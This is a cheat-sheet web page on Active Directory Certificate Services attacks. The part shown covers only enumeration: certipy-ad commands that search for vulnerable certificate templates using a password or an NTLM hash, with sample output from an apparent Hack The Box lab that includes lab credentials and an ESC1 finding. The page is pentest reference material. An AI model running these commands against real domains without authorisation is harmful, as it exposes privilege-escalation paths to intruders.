<!DOCTYPE html><html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant="" defer=""></script>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<meta name="description" content="">
<title>ADCS | TLDRBins</title>
<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
</head>
<body>
<header>
  <h1>
    <a href="https://tldrbins.github.io/">
      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
      <span>TLDRBins</span>
    </a><span class="hl"> / </span>
    <a href="https://tldrbins.github.io/adcs/"><span>ADCS</span></a></h1>
  <div class="theme-toggle-wrapper">
    <div class="theme-toggle">
      <div class="theme-toggle-track">
        <div class="theme-toggle-track-dark">
          <img src="../mode-dark.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
        </div>
        <div class="theme-toggle-track-light">
          <img src="../mode-light.svg" role="presentation" style="pointer-events: none;" width="16" height="16">
        </div>
      </div>
      <div class="theme-toggle-thumb"></div>
      <input class="theme-toggle-screenreader-only" type="checkbox" aria-label="Switch between Dark and Light mode">
    </div>
  </div>
  <style>
  .theme-toggle-wrapper, .theme-toggle {
      margin: 0;
      padding: 0;
      border: 0;
      box-sizing: border-box;
  }

  .theme-toggle-wrapper {
      display: table;
      float: right;
      margin-left: auto;
  }

  .theme-toggle {
      touch-action: pan-x;
      display: inline-block;
      position: relative;
      cursor: pointer;
      background-color: transparent;
      user-select: none;
  }

  .theme-toggle-screenreader-only {
      position: absolute;
      width: 1px;
      height: 1px;
      margin: -1px;
      padding: 0;
      overflow: hidden;
      clip: rect(0, 0, 0, 0);
  }

  .theme-toggle-track {
      width: 50px;
      height: 24px;
      border-radius: 30px;
      background-color: hsl(223, 61%, 44%);
      transition: background-color 0.2s ease;
  }

  .theme-toggle-track-dark,
  .theme-toggle-track-light {
      position: absolute;
      width: 17px;
      height: 17px;
      top: 50%;
      transform: translateY(-50%);
      transition: opacity 0.25s ease;
  }

  .theme-toggle-track-dark {
      left: 5px;
      opacity: 0;
  }

  .theme-toggle--checked .theme-toggle-track-dark {
      opacity: 1;
  }

  .theme-toggle-track-light {
      right: 5px;
      opacity: 1;
  }

  .theme-toggle--checked .theme-toggle-track-light {
      opacity: 0;
  }

  .theme-toggle--checked .theme-toggle-track {
      background-color: hsl(222, 14%, 7%);
  }

  .theme-toggle-thumb {
      position: absolute;
      top: 1px;
      left: 1px;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      background-color: #fafafa;
      transition: transform 0.5s cubic-bezier(0.23, 1, 0.32, 1);
  }

  .theme-toggle--checked .theme-toggle-thumb {
      transform: translateX(26px);
  }
  </style>
  <script>
      const body = document.body;
      const themeSwitcher = document.querySelector('.theme-toggle');      

      themeSwitcher.addEventListener('click', () => {
          const isDarkMode = themeSwitcher.classList.toggle('theme-toggle--checked');
          body.classList.toggle('dark-mode', isDarkMode);
          if (isDarkMode) {
              localStorage.setItem('darkMode', 'true');
          } else {
              localStorage.removeItem('darkMode');
          }
      });      

      if (localStorage.getItem('darkMode')) {
          themeSwitcher.classList.add('theme-toggle--checked');
          body.classList.add('dark-mode');
      }
  </script>
  <p class="desc"></p>
</header>
<main>
<ul class="tagsList single">
  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
  <li><a href="https://tldrbins.github.io/@adcs/">ADCS</a></li>
  <li><a href="https://tldrbins.github.io/@certificate-services/">Certificate Services</a></li>
  <li><a href="https://tldrbins.github.io/@certify/">Certify</a></li>
  <li><a href="https://tldrbins.github.io/@credential-dumping/">Credential Dumping</a></li>
  <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
  <li><a href="https://tldrbins.github.io/@ldap/">Ldap</a></li>
  <li><a href="https://tldrbins.github.io/@lookup-sid/">Lookup SID</a></li>
  <li><a href="https://tldrbins.github.io/@pass-the-cert/">Pass-the-Cert</a></li>
  <li><a href="https://tldrbins.github.io/@pass-the-hash/">Pass-the-Hash</a></li>
  <li><a href="https://tldrbins.github.io/@pass-the-ticket/">Pass-the-Ticket</a></li>
  <li><a href="https://tldrbins.github.io/@ticket-granting-ticket/">Ticket Granting Ticket</a></li>
  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
</ul>
<hr>
<div class="content">
  <div class="tips">
  <p><strong>Usage Tips:</strong></p>
  <ul>
    <li>Click on a keyword to enable inline editing.</li>
    <li>Click inside a code block to copy (excludes comments).</li>
    <li>Use the <strong><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -6 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></strong> button to view examples.</li>
    <li>Click outside to collapse all examples.</li>
  </ul>
</div>
  <div id="dynamicFormContainer">
	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="BASE64_PFX">BASE64 PFX: </label><input type="text" name="BASE64_PFX"></div><div class="input-group"><label for="CA">CA: </label><input type="text" name="CA"></div><div class="input-group"><label for="CCACHE">CCACHE: </label><input type="text" name="CCACHE"></div><div class="input-group"><label for="COM">COM: </label><input type="text" name="COM"></div><div class="input-group"><label for="DC_HOSTNAME">DC HOSTNAME: </label><input type="text" name="DC_HOSTNAME"></div><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN_NETBIOS_NAME">DOMAIN NETBIOS NAME: </label><input type="text" name="DOMAIN_NETBIOS_NAME"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="EXAMPLE">EXAMPLE: </label><input type="text" name="EXAMPLE"></div><div class="input-group"><label for="GENERATED_PASSWORD">GENERATED PASSWORD: </label><input type="text" name="GENERATED_PASSWORD"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="ISSUER">ISSUER: </label><input type="text" name="ISSUER"></div><div class="input-group"><label for="LOCAL_IP">LOCAL IP: </label><input type="text" name="LOCAL_IP"></div><div class="input-group"><label for="NEW_COMPUTER">NEW COMPUTER: </label><input type="text" name="NEW_COMPUTER"></div><div class="input-group"><label for="NEW_PASSWORD">NEW PASSWORD: </label><input type="text" name="NEW_PASSWORD"></div><div class="input-group"><label for="NEW_USER">NEW USER: </label><input type="text" name="NEW_USER"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="REQUEST_ID">REQUEST ID: </label><input type="text" name="REQUEST_ID"></div><div class="input-group"><label for="SERIAL_NUMBER">SERIAL NUMBER: </label><input type="text" name="SERIAL_NUMBER"></div><div class="input-group"><label for="SERVER">SERVER: </label><input type="text" name="SERVER"></div><div class="input-group"><label for="SID">SID: </label><input type="text" name="SID"></div><div class="input-group"><label for="TARGET_COMPUTER">TARGET COMPUTER: </label><input type="text" name="TARGET_COMPUTER"></div><div class="input-group"><label for="TARGET_URL">TARGET URL: </label><input type="text" name="TARGET_URL"></div><div class="input-group"><label for="TARGET_USER_HASH">TARGET USER HASH: </label><input type="text" name="TARGET_USER_HASH"></div><div class="input-group"><label for="TARGET_USER_PASSWORD">TARGET USER PASSWORD: </label><input type="text" name="TARGET_USER_PASSWORD"></div><div class="input-group"><label for="TARGET_USER_UPN">TARGET USER UPN: </label><input type="text" name="TARGET_USER_UPN"></div><div class="input-group"><label for="TARGET_USER">TARGET USER: </label><input type="text" name="TARGET_USER"></div><div class="input-group"><label for="TARGET">TARGET: </label><input type="text" name="TARGET"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="VICTIM">VICTIM: </label><input type="text" name="VICTIM"></div><div class="input-group"><label for="VULN_TEMPLATE">VULN TEMPLATE: </label><input type="text" name="VULN_TEMPLATE"></div><div class="input-group"><label for="X509_ISSUER_SERIAL_NUMBER_FORMAT">X509 ISSUER SERIAL NUMBER FORMAT: </label><input type="text" name="X509_ISSUER_SERIAL_NUMBER_FORMAT"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
	<div class="buttons center">
		<button id="form_btn">Show Inspector</button>
		<button id="replace_btn" style="display: none;">Replace Params</button>
		<button id="reset_btn" style="display: none;">Reset</button>
		<button id="clear_btn" style="display: none;">Clear Cache</button>
	</div>
</div>
  <style>
:root{
   
  --line:     var(--grey-lighten-4, #e6e6e6);
  --bg:       var(--grey-lighten-5, #f7f7f7);
  --fg:       var(--grey, #666);
  --hover-bg: var(--grey-lighten-4, #ececec);
  --active-bg: white;
  --active-fg: var(--primary, #6b46c1);

  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);
  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);
  --dm-fg:     #a8a8a8;
  --dm-hover:  #ae81ff;
  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);
  --dm-active-fg: #ae81ff;
}

 
.auth-wrapper {
  display: flex;
  justify-content: center;      
  width: 100%;
}

.auth-frame {
  border: 1px solid var(--line);
  border-radius: 10px;
  overflow: hidden;
  width: 100%;
  max-width: 900px;             
  background: var(--line);
  box-sizing: border-box;
}

 
.auth-grid {
  display: grid;
  grid-template-columns: 1fr 1fr 1fr;
  grid-template-rows: auto 1fr 1fr;
  gap: 1px;                     
  background: transparent;
  width: 100%;
  height: 100%;
}

 
.cell {
  background: var(--bg);
  min-height: 50px;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 0;
  color: var(--fg);
  transition: background-color .12s ease, color .12s ease;
}

 
.title {
  grid-column: 1 / -1;
  font-weight: 700;
  font-size: 1.05rem;
  color: var(--grey-darken-2);
  background: var(--bg);
  padding: 10px;
  text-align: center;
  user-select: none;         
  pointer-events: none;      
}

 
.cell-ker {
  user-select: none;         
  pointer-events: none;      
}

 
.cell-all    { grid-row: 2 / 4; grid-column: 1; }
.cell-pw     { grid-row: 2; grid-column: 2; }
.cell-ntlm   { grid-row: 3; grid-column: 2; }
.cell-ker    { grid-row: 2; grid-column: 3; }
.cell-subs   { grid-row: 3; grid-column: 3; }

 
.btn {
  width: 100%;
  height: 100%;
  background: transparent;
  border: none;
  cursor: pointer;
  font-weight: 700;
  font-size: 0.9rem;
  color: inherit;
  text-align: center;
  padding: 12px 8px;
  box-sizing: border-box;
}

 
.auth-grid .cell:hover:not(.has-subrow) {
  background: var(--hover-bg);
  color: var(--active-fg);  
}
.auth-grid .cell:has(.btn.active):not(.has-subrow) {
  background: var(--active-bg);
  color: var(--active-fg);
}

 
.sub-row {
  display: flex;
  width: 100%;
  height: 100%;
  gap: 1px;
  box-sizing: border-box;
}
.sub-item {
  flex: 1;
  background: var(--bg);
  display: flex;
  align-items: center;
  justify-content: center;
  color: var(--fg);
  transition: background .12s ease, color .12s ease;
}
.sub-item .btn { width: 100%; height: 100%; }

.sub-item:hover {
  background: var(--hover-bg);
  color: var(--active-fg);
}
.sub-item:has(.btn.active) {
  background: var(--active-bg);
  color: var(--active-fg);
}

 
body.dark-mode .auth-frame {
  border-color: var(--dm-line);
  background: var(--dm-line);
}
body.dark-mode .cell,
body.dark-mode .sub-item {
  background: var(--dm-bg);
  color: var(--dm-fg);
}
body.dark-mode .title {
  background: var(--dm-bg);
  color: #d5d5d5;
}

body.dark-mode .cell:hover:not(.has-subrow) {
  background: var(--dm-hover);
  color: var(--dm-active-bg);  
}
body.dark-mode .cell:has(.btn.active):not(.has-subrow) {
  background: var(--dm-active-bg);
  color: var(--dm-active-fg);
}
body.dark-mode .sub-item:hover {
  background: var(--dm-hover);
  color: var(--dm-active-bg);
}
body.dark-mode .sub-item:has(.btn.active) {
  background: var(--dm-active-bg);
  color: var(--dm-active-fg);
}

 
.highlight.active-block pre {
  border: 1px solid var(--grey-lighten-3);
  border-radius: 0.2rem;
}

.highlight.active-block.codeBlock pre:hover,
.highlight.active-block.codeBlock-start pre:hover,
.highlight.active-block.codeBlock-end pre:hover {
  border-color: var(--secondary);
}

body.dark-mode .highlight.active-block pre {
  border-color: var(--grey-darken-4);
}

body.dark-mode .highlight.active-block.codeBlock pre:hover,
body.dark-mode .highlight.active-block.codeBlock-start pre:hover,
body.dark-mode .highlight.active-block.codeBlock-end pre:hover {
  border-color: var(--grey-lighten-1);
}

 
@media (max-width: 768px) {
  .auth-grid {
    grid-template-columns: 1fr;
    grid-template-rows: auto repeat(5, auto);
  }
  .cell-all,
  .cell-pw,
  .cell-ntlm,
  .cell-ker,
  .cell-subs {
    grid-row: auto;
    grid-column: 1;
  }
  .sub-row { flex-direction: column; }
}
</style>

<script>
document.addEventListener("DOMContentLoaded", () => {
  const buttons = document.querySelectorAll(".auth-grid .btn");
  const filters = ["password", "ntlm", "password-based-kerberos", "ntlm-based-kerberos", "ticket-based-kerberos"];

  const filterMap = {
    password: ["password"],
    ntlm: ["ntlm"],
    "kerberos-password": ["password-based-kerberos"],
    "kerberos-ntlm": ["ntlm-based-kerberos"],
    "kerberos-ticket": ["ticket-based-kerberos"],
    all: filters,
  };

  function filterBlocks(filter) {
    const targetClasses = filterMap[filter] || [];
    const authClasses = [
      "password",
      "ntlm",
      "password-based-kerberos",
      "ntlm-based-kerberos",
      "ticket-based-kerberos",
    ];
    const blocks = [...document.querySelectorAll(".highlight")];
    const groups = [];
    let current = [];

    
    blocks.forEach(block => {
      current.push(block);
      const isEnd = block.classList.contains("codeBlock-end");
      const isStandalone = block.classList.contains("codeBlock-start") && block.classList.contains("codeBlock-end");
      if (isEnd || isStandalone) {
        groups.push(current);
        current = [];
      }
    });
    if (current.length) groups.push(current);

    
    groups.forEach(group => {
      const authBlocks = group.filter(b => authClasses.some(c => b.classList.contains(c)));
      if (!authBlocks.length) return; 

      
      if (filter === "all") {
        authBlocks.forEach(b => {
          b.style.display = "block";
          b.classList.remove("active-block");
        });
        return;
      }

      
      const matched = authBlocks.filter(b =>
        targetClasses.some(tc => b.classList.contains(tc))
      );

      if (matched.length > 0) {
        
        authBlocks.forEach(b => {
          const visible = matched.includes(b);
          b.style.display = visible ? "block" : "none";
          b.classList.toggle("active-block", visible);
        });
        return;
      }

      
      let fallback = authBlocks.filter(b => b.classList.contains("password"));
      if (fallback.length === 0) {
        fallback = authBlocks.filter(b => b.classList.contains("ntlm"));
      }

      
      authBlocks.forEach(b => {
        const visible = fallback.includes(b);
        b.style.display = visible ? "block" : "none";
        b.classList.toggle("active-block", visible);
      });
    });
  }

  function setActiveButton(btn) {
    buttons.forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    const filter = btn.dataset.filter;
    localStorage.setItem("authFilter", filter);
    filterBlocks(filter);
  }

  const saved = localStorage.getItem("authFilter");
  const initial = saved && filterMap[saved] ? saved : "all";
  const initBtn = [...buttons].find(b => b.dataset.filter === initial);
  initBtn ? setActiveButton(initBtn) : filterBlocks("all");

  buttons.forEach(btn => btn.addEventListener("click", () => setActiveButton(btn)));
});
</script>

<br>


<div class="auth-wrapper">
  <div class="auth-frame">
    <div class="auth-grid">
      <div class="cell title">Authentication Method</div>

      <div class="cell cell-all">
        <button class="btn" data-filter="all">ALL</button>
      </div>

      <div class="cell cell-pw">
        <button class="btn" data-filter="password">PASSWORD</button>
      </div>

      <div class="cell cell-ntlm">
        <button class="btn" data-filter="ntlm">NTLM</button>
      </div>

      <div class="cell cell-ker">
        <button class="btn" data-filter="kerberos">KERBEROS</button>
      </div>

      <div class="cell cell-subs has-subrow">
        <div class="sub-row">
          <div class="sub-item"><button class="btn" data-filter="kerberos-password">PASSWORD</button></div>
          <div class="sub-item"><button class="btn" data-filter="kerberos-ntlm">NTLM</button></div>
          <div class="sub-item"><button class="btn active" data-filter="kerberos-ticket">TICKET</button></div>
        </div>
      </div>
    </div>
  </div>
</div>

<h3 id="enumeration">Enumeration</h3>
<p class="tabs">
<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>

<button data-tabset="set1" data-tabcontent="tab2">Windows</button>

</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><p class="tabs"><button data-tabset="set1-1" data-tabcontent="tab1" class="active">certipy-ad</button>
<button data-tabset="set1-1" data-tabcontent="tab2">nxc</button></p>
<div class="tabset-wrapper" data-tabset-group="set1-1"><div class="tabcontent active" data-tabset="set1-1" data-tabcontent="tab1"><div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -text -stdout -vulnerable
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -u <span class="s1">'ryan.cooper'</span> -p <span class="s1">'NuclearMosquito3'</span> -target dc.sequel.htb -text -stdout -vulnerable
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 34 certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 12 enabled certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 15 issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 0 OIDs linked to templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Failed to connect to remote registry. Service should be starting now. Trying again...
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Error checking web enrollment: timed out
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Enumeration output:
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Authorities
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    CA Name                             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    DNS Name                            : dc.sequel.htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Validity End            : 2121-11-18 21:08:46+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Web Enrollment
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTP
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">      HTTPS
</span></span></span><span class="line"><span class="cl"><span class="go">        Enabled                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    User Specified SAN                  : Disabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Request Disposition                 : Issue
</span></span></span><span class="line"><span class="cl"><span class="go">    Enforce Encryption for Requests     : Enabled
</span></span></span><span class="line"><span class="cl"><span class="go">    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Owner                             : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">      Access Rights
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCa                        : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        ManageCertificates              : SEQUEL.HTB\Administrators
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Enroll                          : SEQUEL.HTB\Authenticated Users
</span></span></span><span class="line"><span class="cl"><span class="go">Certificate Templates
</span></span></span><span class="line"><span class="cl"><span class="go">  0
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Name                       : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Display Name                        : UserAuthentication
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Authorities             : sequel-DC-CA
</span></span></span><span class="line"><span class="cl"><span class="go">    Enabled                             : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Client Authentication               : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Agent                    : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Any Purpose                         : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollee Supplies Subject           : True
</span></span></span><span class="line"><span class="cl"><span class="go">    Certificate Name Flag               : EnrolleeSuppliesSubject
</span></span></span><span class="line"><span class="cl"><span class="go">    Enrollment Flag                     : IncludeSymmetricAlgorithms
</span></span></span><span class="line"><span class="cl"><span class="go">                                          PublishToDs
</span></span></span><span class="line"><span class="cl"><span class="go">    Private Key Flag                    : ExportableKey
</span></span></span><span class="line"><span class="cl"><span class="go">    Extended Key Usage                  : Client Authentication
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Secure Email
</span></span></span><span class="line"><span class="cl"><span class="go">                                          Encrypting File System
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Manager Approval           : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Requires Key Archival               : False
</span></span></span><span class="line"><span class="cl"><span class="go">    Authorized Signatures Required      : 0
</span></span></span><span class="line"><span class="cl"><span class="go">    Schema Version                      : 2
</span></span></span><span class="line"><span class="cl"><span class="go">    Validity Period                     : 10 years
</span></span></span><span class="line"><span class="cl"><span class="go">    Renewal Period                      : 6 weeks
</span></span></span><span class="line"><span class="cl"><span class="go">    Minimum RSA Key Length              : 2048
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Created                    : 2022-11-18T21:10:22+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Template Last Modified              : 2024-01-19T00:26:38+00:00
</span></span></span><span class="line"><span class="cl"><span class="go">    Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">      Enrollment Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Enrollment Rights               : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">      Object Control Permissions
</span></span></span><span class="line"><span class="cl"><span class="go">        Owner                           : SEQUEL.HTB\Administrator
</span></span></span><span class="line"><span class="cl"><span class="go">        Full Control Principals         : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Owner Principals          : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">        Write Property Enroll           : SEQUEL.HTB\Domain Admins
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">                                          SEQUEL.HTB\Enterprise Admins
</span></span></span><span class="line"><span class="cl"><span class="go">    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
</span></span></span><span class="line"><span class="cl"><span class="go">    [!] Vulnerabilities
</span></span></span><span class="line"><span class="cl"><span class="go">      ESC1                              : Enrollee supplies subject and template allows client authentication.
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -text -stdout -vulnerable
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad find -u <span class="s1">'ryan.cooper'</span> -hashes <span class="s1">'98981eed8e9ce0763bb3c5b3c7ed5945'</span> -target dc.sequel.htb -text -stdout -vulnerable
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
</span></span></span><span class="line"><span class="cl"><span class="go">[!] Use -debug to print a stacktrace
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 34 certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding certificate authorities
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 1 certificate authority
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 12 enabled certificate templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Finding issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 15 issuance policies
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found 0 OIDs linked to templates
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
